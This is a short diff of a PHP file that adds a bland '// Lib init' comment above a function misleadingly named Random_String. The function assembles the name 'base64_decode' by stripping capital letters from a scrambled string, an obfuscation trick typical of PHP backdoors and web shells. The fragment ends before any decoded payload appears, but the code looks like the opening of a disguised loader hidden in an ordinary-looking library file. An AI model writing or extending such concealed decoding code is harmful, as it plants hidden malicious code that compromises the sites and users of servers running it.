@@ -1,5 +1,5 @@
 <?php
-
+// Lib init
 function Random_String(){
     
 	$d = preg_replace('/[A-Z]/','','QbDaseG6F4_dFFEeFcoSdDeW');				// base64_decode
